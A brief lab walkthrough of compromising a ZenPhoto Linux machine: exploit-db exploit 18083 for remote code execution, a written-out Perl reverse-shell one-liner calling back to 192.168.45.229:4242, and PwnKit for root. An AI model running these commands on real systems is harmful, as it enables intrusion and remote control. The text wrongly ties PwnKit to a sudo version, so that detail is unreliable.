# 🐧 ZenPhoto (Linux) Walkthrough

## 🔍 Initial Foothold

- Ran `gobuster` and found ZenPhoto installation at `/test/`
- Discovered RCE vulnerability using [exploit 18083](https://www.exploit-db.com/exploits/18083)
- Ran the exploit:
  ```bash
  php 18083.php 192.168.195.41 /test/
  ```
- Received limited PHP shell.

### 🧪 Upgraded to Full Shell
Used reverse shell with Perl:
```bash
perl -e 'use Socket;$i="192.168.45.229";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Resources:**
- [Reverse Shell Cheatsheet – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
- [Socat Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#socat)

---

## 🚀 Privilege Escalation

- Found vulnerable sudo version: `1.7.2p1`
- Used CVE-2021-4034 (PwnKit) for PE
- [Exploit GitHub Link](https://github.com/arthepsy/CVE-2021-4034)

---

## ✅ Summary

- **Initial Access:** ZenPhoto RCE exploit
- **Shell Upgrade:** Perl reverse shell
- **Privilege Escalation:** CVE-2021-4034 – PwnKit exploit